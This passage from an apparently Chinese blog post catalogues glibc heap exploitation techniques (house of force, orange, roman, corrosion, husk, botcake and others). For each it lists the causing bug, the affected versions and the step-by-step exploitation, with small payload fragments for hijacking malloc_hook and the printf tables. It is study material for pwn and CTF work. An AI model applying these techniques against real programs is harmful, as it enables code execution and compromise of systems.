title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.28</code></li><li>可分配任意大小的 <code>chunk</code></li><li>需要泄露或已知地址</li></ul><h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>对 <code>top_chunk</code> 的利用，过程如下：</p><ul><li>申请 <code>chunk A</code></li><li>写 <code>A</code> 的时候溢出，修改 <code>top_chunk</code> 的 <code>size</code> 为很大的数</li><li>分配很大的 <code>chunk</code> 到任意已知地址</li></ul><h3 id="相关技巧-2"><a href="#相关技巧-2" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>注意，在 <code>glibc-2.29</code> 后加入了检测，<code>house of force</code> 基本失效：</p><p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250217172739313.png" alt="image-20250217172739313"></p><h3 id="利用效果-2"><a href="#利用效果-2" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>需要泄露或已知地址</li></ul><h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><p>控制 <code>smallbin</code> 的 <code>bk</code> 指针，示例如下：</p><ul><li>申请 <code>chunk A、chunk B、chunk C</code>，其中 <code>chunk B</code> 大小位于 <code>smallbin</code></li><li>释放 <code>B</code>，申请更大的 <code>chunk D</code>，使得 <code>B</code> 进入 <code>smallbin</code></li><li>写 <code>A</code>，溢出修改 <code>B</code> 的 <code>bk</code>，指向地址 <code>X</code>，这里有 <code>fake chunk</code></li><li>布置 <code>X-&gt;fd == &amp;B</code></li><li>分配两次后即可取出位于 <code>X</code> 地址处的 <code>fake chunk</code></li></ul><h3 id="相关技巧-3"><a href="#相关技巧-3" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>在引入了 <code>tcache stash unlink</code> 的时候，需要注意绕过：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。(<strong>对应tcache为空或者满</strong>)</p><p>实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 <code>fastbin/tcachebin</code>。</p><h3 id="利用效果-3"><a href="#利用效果-3" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p><h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.26</code></li><li><strong>没有 <code>free</code></strong></li><li>可以 <code>unsortedbin attack</code></li></ul><h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of orange</code> 可以说是开启了堆与 <code>IO</code> 组合利用的先河，是非常经典、漂亮、精彩的利用组合技。利用过程还要结合 <code>top_chunk</code> 的性质，利用过程如下：</p><p><strong>stage1</strong></p><ul><li>申请 <code>chunk A</code>，假设此时的 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xWXYZ</code></li><li>写 <code>A</code>，溢出修改 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xXYZ</code>（需要满足页对齐的检测条件）</li><li>申请一个大于 <code>0xXYZ</code> 大小的 <code>chunk</code>，此时 <code>top_chunk</code> 会进行 <code>grow</code>，并将原来的 <code>old top_chunk</code> 释放进入 <code>unsortedbin</code></li></ul><p><strong>stage2</strong></p><ul><li>溢出写 <code>A</code>，修改处于 <code>unsortedbin</code> 中的 <code>old top_chunk</code>，修改其 <code>size</code> 为 <code>0x61</code>，其 <code>bk</code> 为 <code>&amp;_IO_list_all-0x10</code>，同时伪造好 <code>IO_FILE</code> 结构</li><li>申请非 <code>0x60</code> 大小的 <code>chunk</code> 的时候，首先触发 <code>unsortedbin attack</code>，将<code>_IO_list_all</code> 修改为 <code>main_arena+88</code>，然后 <code>unsortedbin chunk</code> 会进入到 <code>smallbin</code>，大小为 <code>0x60</code>；接着遍历 <code>unsortedbin</code> 的时候触发了 <code>malloc_printerr</code>，然后调用链为：<code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code>，调用到伪造的 <code>vtable</code> 里面的函数指针（也可以exit调用之类的，感觉不一定局限于<code>malloc_printerr</code>）</li></ul><h3 id="相关技巧-4"><a href="#相关技巧-4" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>在 <code>glibc-2.24</code> 后加入了 <code>vtable</code> 的 <code>check</code>，不能任意地址伪造 <code>vatble</code> 了，但是可以利用 <code>IO_str_jumps</code> 结构进行利用。</li><li>在 <code>glibc-2.26</code> 后，<code>malloc_printerr</code> 不再刷新 <code>IO</code> 流了，所以该方法失效</li><li>由于<code>_mode</code> 的正负性是随机的，影响判断条件，大概有 <code>1/2</code> 的概率会利用失败，多试几次就好</li></ul><h3 id="利用效果-4"><a href="#利用效果-4" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li><li>任意命令执行</li></ul><h2 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h2><h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.26</code></li><li>超过 <code>0x400</code> 大小的堆分配</li><li>可以写 <code>fastbin</code> 的 <code>fd</code> 或者 <code>size</code> 域</li></ul><h3 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h3><p>该利用技巧的核心是 <code>malloc_consolidate</code> 函数，当检测到有 <code>fastbin</code> 的时候，会取出每一个 <code>fastbin chunk</code>，将其放置到 <code>unsortedbin</code> 中，并进行合并。以修改 <code>fd</code> 为例，利用过程如下：</p><ul><li>申请 <code>chunk A</code>、<code>chunk B</code>，其中 <code>chunk A</code> 的大小位于 <code>fastbin</code> 范围</li><li>释放 <code>chunk A</code>，使其进入到 <code>fastbin</code></li><li>利用 <code>use after free</code>，修改 <code>A-&gt;fd</code> 指向地址 <code>X</code>，需要伪造好 <code>fake chunk</code>，使其不执行 <code>unlink</code> 或者绕过 <code>unlink</code></li><li>分配足够大的 <code>chunk</code>，或者释放 <code>0x10000</code> 以上的 <code>chunk</code>，只要能触发 <code>malloc_consolidate</code> 即可</li><li>此时 <code>fake chunk</code> 被放到了 <code>unsortedbin</code>，或者进入到对应的 <code>smallbin/largebin</code></li><li>取出 <code>fake chunk</code> 进行读写即可</li></ul><h3 id="相关技巧-5"><a href="#相关技巧-5" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><code>2.26</code> 加入了 <code>unlink</code> 对 <code>presize</code> 的检查</li><li><code>2.27</code> 加入了 <code>fastbin</code> 的检查</li></ul><p>抓住重点：<code>house of rabbit</code> 是对 <code>malloc_consolidate</code> 的利用。因此，不一定要按照原作者的思路来，他的思路需要满足的条件太多了。</p><h3 id="利用效果-5"><a href="#利用效果-5" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h2><h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>use after free</code>、堆溢出</p><h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.29</code></li><li>可以 <code>use after edit</code></li><li>不需要泄露地址</li><li>需要部分字节</li></ul><h3 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h3><ul><li><p>申请chunkA，chunkB，chunkC，chunkD，chunkE，其中chunkB的大小为0xd0</p></li><li><p>在chunkB中写入<code>&quot;A&quot;*0x68+p64(0x61)</code></p></li><li><p>释放掉B，B进入unsortedbin，然后chunkA溢出修改chunkB的size为0x71，此时chunkB的fd和bk都是main_arena+88</p></li><li><p>然后将chunkD和chunkE都释放进fastbin中，size域为0x70的</p></li><li><p>然后利用uaf部分地址写，将chunkB伪造的chunk链入fastbin中</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x555555757160 —▸ <span class="number">0</span>x555555757020 —▸ <span class="number">0</span>x7ffff7dd1b78 (main_arena+<span class="number">88</span>) ◂— <span class="number">0</span>x7ffff7dd1b78</span><br></pre></td></tr></table></figure></li><li><p>然后修改chunkB的fd的低2字节，使B-&gt;fd&#x3D; malloc_hook - 0x23</p></li><li><p>然后分配3个chunk的size为0x70的就能获得这个fake chunk了</p></li><li><p>然后在之前就要多分配一个0x70大小的chunk此时来通过uaf修复fastbin（注意堆风水）</p></li><li><p>之后通过unsortedbin attack来修改malloc_hook为一个libcbase+0xXXXX</p></li><li><p>之后部分写malloc_hook的低字节使其偏向onegadget，需要爆破</p></li></ul><h3 id="相关技巧-6"><a href="#相关技巧-6" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>使用 <code>house of roman</code> 的时候，需要采用多线程爆破</li><li>可以使用其他方法代替，比如先攻击 <code>stdout</code> 泄露地址，使得爆破的成本降低</li></ul><h3 id="利用效果-6"><a href="#利用效果-6" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>执行 <code>one_gadget</code></li><li>绕过 <code>ASLR</code></li></ul><h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.28</code> 因为2.29的unsortedbin attack失效</li><li>可以进行 <code>unsortedbin attack</code></li><li>可以进行 <code>largebin attack</code>，修改 <code>bk</code> 和 <code>bk_nextsize</code></li><li>可以分配 <code>0x50</code> 大小的 <code>chunk</code></li></ul><h3 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of storm</code> 也是一款组合技，利用开启了 <code>PIE</code> 的 <code>x64</code> 程序的堆地址总是 <code>0x55xxxx...</code> 或者 <code>0x56xxxx...</code> 开头这一特性，使用一次 <code>largebin attack</code> 写两个堆地址，使用一次 <code>unsortedbin attack</code> 写一次 <code>libc</code> 地址，可以实现任意地址分配。虽然 <code>house of storm</code> 最后能达到任意地址分配，但是由于其所需的条件比较多，一般可以用其他更简便的堆利用技术代替。利用思路如下：</p><ul><li>进行一次 <code>unsortedbin attack</code>，其 <code>bk</code> 修改为 <code>addr</code></li><li>进行一次 <code>largebin attack</code>，其 <code>bk</code> 修改为 <code>addr+0x10</code>，<code>bk_nextsize</code> 修改为 <code>addr-0x20+3</code></li><li>申请 <code>0x50</code> 大小的 <code>chunk</code> 即可申请到 <code>addr</code> 处</li></ul><h3 id="相关技巧-7"><a href="#相关技巧-7" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>需要注意的有：</p><ul><li>该方法成功的几率是 <code>50%</code>，因为 <code>0x55</code> 会触发 <code>assert</code> 断言，<code>0x56</code> 才能成功</li><li>申请 <code>addr</code> 处的 <code>chunk</code> 的时候需要从 <code>unsortedbin</code> 里面取</li></ul><h3 id="利用效果-7"><a href="#利用效果-7" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li></ul><h2 id="house-of-corrosion"><a href="#house-of-corrosion" class="headerlink" title="house of corrosion"></a>house of corrosion</h2><h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code></p><h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>任意大小分配</li><li>可以修改 <code>global_max_fast</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h3><p>一个非常 <code>tricky</code> 的方法，可以绕过 <code>aslr</code>，不需要泄露地址都能达成 <code>rce</code>，可以很很多方法结合起来应用。先说利用原理：</p><ul><li>使用 <code>unsortedbin attack/largebin attack</code> 等方法，成功修改 <code>global_max_fast</code> 的值为很大的值。如果使用 <code>unsortedbin attack</code>，不需要泄露地址，爆破 <code>1/16</code> 即可</li><li>申请任意大小的 <code>chunk</code>，这些 <code>chunk</code> 都会被视为 <code>fastbin chunk</code>，然后利用这些 <code>chunk</code> 来进行读和写</li></ul><p>此时的计算公式为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (chunk addr - &amp;main_arena.fastbinsY) x <span class="number">2</span> + <span class="number">0x20</span></span><br></pre></td></tr></table></figure><p><strong>原语1：</strong>（任意地址任意写）</p><ul><li><p>假如我们要修改的地址为0x2000上的数据，此时我们的main_arena.fatbinsY的地址是0x1000</p></li><li><p>计算size&#x3D;(0x2000-0x1000)*2+0x20&#x3D;0x2020，所以就要先事先chunkA&#x3D;malloc(0x2018)</p></li><li><p>之后通过unsortedbin attack或者largebin attack，改写global_max_fast</p></li><li><p>此时free掉事先分配好的chunkA，目标地址会指向A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153144362.png" alt="image-20250218153144362" style="zoom:50%;" /></p></li><li><p>通过UAF修改A的fd为value，*A&#x3D;value<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153228419.png" alt="image-20250218153228419" style="zoom: 50%;" /></p></li><li><p>之后再分配回来，value也就成功写入对应的target_addr</p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153328675.png" alt="image-20250218153328675" style="zoom:50%;" /></li></ul><p><strong>原语2：</strong>（转移已经存在的值）</p><ul><li>首先假设目标地址为0x2000，0x3000上存有一个libc地址，fastbinY的地址为0x1000，计算<code>size1=(0x2000-0x1000)*2+0x20=0x2020</code>，<code>size2=(0x3000-0x1000)*2+0x20=0x4020</code></li><li>此时分配两个size都为size1的chunkA和chunkB，并且通过unsortedbin attack或者largebin attack改写global_max_fast</li><li>之后释放掉chunkA和chunkB<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154308999.png" alt="image-20250218154308999" style="zoom:50%;" /></li><li>通过UAF，部分写chunkA的fd使其指向本身，达到double free类似的效果<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154357013.png" alt="image-20250218154357013" style="zoom:50%;" /></li><li>再把A给分配回来，同时篡改chunkA的size为size2，释放掉A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154440828.png" alt="image-20250218154440828" style="zoom:50%;" /></li><li>再次篡改A的size,恢复为size1，然后malloc(size1),就成功完成src-&gt;dst数据的转移</li></ul><h3 id="相关技巧-8"><a href="#相关技巧-8" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>虽然至今都能使用 <code>house of corrosion</code>，但是在 <code>glibc-2.37</code> 版本中，<code>global_max_fast</code> 的数据类型被修改为了 <code>int8_u</code>，进而导致可控的空间范围大幅度缩小。</li><li><code>house of corrosion</code> 也可以拓展到 <code>tcachebin</code> 上</li><li>适当控制 <code>global_max_fast</code> 的大小，把握控制的空间范围</li><li>可以和 <code>IO_FILE</code> 结合起来泄露信息</li></ul><h3 id="利用效果-8"><a href="#利用效果-8" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li><code>glibc</code> 上的地址泄露</li><li>执行 <code>one_gadget</code></li></ul><h2 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h2><h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li>2.23–2.35</li><li>劫持 <code>__printf_function_table</code> 使其不为空，劫持 <code>__printf_arginfo_table</code> 使其表中存放的 <code>spec</code> 的位置是 <code>backdoor()</code>，执行到 <code>printf</code> 函数时就可以将执行流劫持到 <code>backdoor()</code></li><li>可触发格式化字符串解析</li></ul><blockquote><p>简单来说printf对自定义的格式化字符串的处理优先于默认的格式化字符串处理，我们通过篡改<code>__printf_function_table</code>来使程序认为存在注册过的自定义格式化字符串，从而触发<code>__printf_arginfo_table</code>上的函数指针</p></blockquote><h3 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h3><p>调用处 <code>1</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">  <span class="comment">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vfprintf-internal.c#1763</span></span><br><span class="line">nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// printf-parsemb.c (__parse_one_specmb函数)</span></span><br><span class="line"><span class="comment">/* Get the format specification.  */</span></span><br><span class="line">spec-&gt;info.spec = (<span class="type">wchar_t</span>) *format++;</span><br><span class="line">spec-&gt;size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>) <span class="comment">// 判断是否为空</span></span><br><span class="line">  || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">  || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span> <span class="comment">// 判断是否为空</span></span><br><span class="line">  <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment"> uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment"> the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">  || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec]) <span class="comment">// 调用__printf_arginfo_table中的函数指针</span></span><br><span class="line">               (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">                &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方式为：</p><ul><li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li><li>设占位符为 <code>α</code>，此时 <code>chunk B</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li></ul><p>调用处 <code>2</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vfprintf-internal.c#1962</span></span><br><span class="line"><span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">          &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">          &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Call the function.  */</span></span><br><span class="line">      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr); <span class="comment">// 调用__printf_function_table中的函数指针</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">         about # of chars.  */</span></span><br><span class="line">      <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">          done = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> all_done;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">done_add</span> (function_done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方式为：</p><ul><li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li><li>设占位符为 <code>α</code>，此时 <code>chunk A</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li></ul><p>该处调用在高版本被删除。</p><h3 id="相关技巧-9"><a href="#相关技巧-9" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>该技巧一般和 <code>largebin attack</code> 结合起来</li><li>在低于 <code>2.36</code> 版本中，<code>__malloc_assert</code> 中有格式化字符串的解析</li><li>还有一个<code>__printf_va_arg_table</code> 也是可以利用的，但是条件比较苛刻</li></ul><h3 id="利用效果-9"><a href="#利用效果-9" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>执行 <code>one_gadget</code></li><li>执行 <code>rop</code> 控制程序执行流</li></ul><h2 id="house-of-kauri"><a href="#house-of-kauri" class="headerlink" title="house of kauri"></a>house of kauri</h2><h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——<code>2.32</code></li></ul><h3 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用原理很简单，修改 <code>tcachebin</code> 的 <code>size</code>，然后使其被放到不同大小的 <code>tcachebin</code> 链表里面去。我感觉这个技巧是很基础的 <code>tcachebin</code> 技巧，甚至不应该被称之为 <code>house of</code>。</p><h3 id="相关技巧-10"><a href="#相关技巧-10" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>无</li></ul><h3 id="利用效果-10"><a href="#利用效果-10" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>多个 <code>tcachebin</code> 链表中存放同一个 <code>chunk</code></li></ul><h2 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house of mind"></a>house of mind</h2><h3 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出，<code>edit after free</code></p><h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以分配任意大小的 <code>chunk</code></li><li>程序在子线程执行malloc</li></ul><h3 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h3><ul><li><p>通过多线程或者特定的分配方式，创建一块非主arena的chunkA</p></li><li><p>然后通过chunkA的地址用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><p>该方式计算出<code>heap_for_ptr</code>的地址</p></li><li><p>在<code>heap_info_addr</code>处伪造mstate ar_ptr指针指向攻击者控制的伪造arena区域</p></li><li><p>之后修改chunkA的<code>non_main_arena</code>标志位为1</p></li><li><p>之后释放chunkA，此时arena_for_chunk(A)会通过伪造的<code>heap_info_addr-&gt;ar_ptr</code>找到伪造的arena区域</p></li><li><p>而伪造的arena区域 可以 控制 fastbin 链表头，实现<strong>任意地址分配</strong>，以此实现任意地址写</p></li></ul><h3 id="相关技巧-11"><a href="#相关技巧-11" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>一般来说，可以分配任意大小的 <code>chunk</code>，还能堆溢出，很多技巧都能用</li><li>这个技巧是希望大家关注对于 <code>arena</code> 的攻击</li><li>甚至可以直接修改 <code>thread_arena</code> 这个变量</li></ul><h3 id="利用效果-11"><a href="#利用效果-11" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址写任意值</li></ul><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><h3 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>double free</code></p><h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>—— 至今</li><li>多次释放 <code>chunk</code> 的能力</li></ul><h3 id="利用原理-12"><a href="#利用原理-12" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以用于绕过 <code>tcache-&gt;key</code> 的检查，利用过程如下：</p><ul><li>申请7个大于size大于0x80的chunk，然后再申请3个，分别为chunkA，chunkB，chunkC（chunkC只是用来隔断<code>top 